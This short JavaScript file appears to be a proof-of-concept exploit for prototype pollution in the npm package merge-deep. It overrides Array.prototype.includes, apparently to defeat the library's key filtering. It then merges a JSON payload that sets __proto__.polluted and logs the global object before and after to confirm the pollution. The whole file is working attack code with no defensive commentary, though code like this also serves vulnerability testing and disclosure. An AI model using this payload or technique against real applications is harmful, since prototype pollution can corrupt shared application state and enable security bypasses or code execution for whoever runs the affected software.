Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
const merge = require('merge-deep');
const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
merge({}, JSON.parse(malicious_payload));
console.log({}.polluted);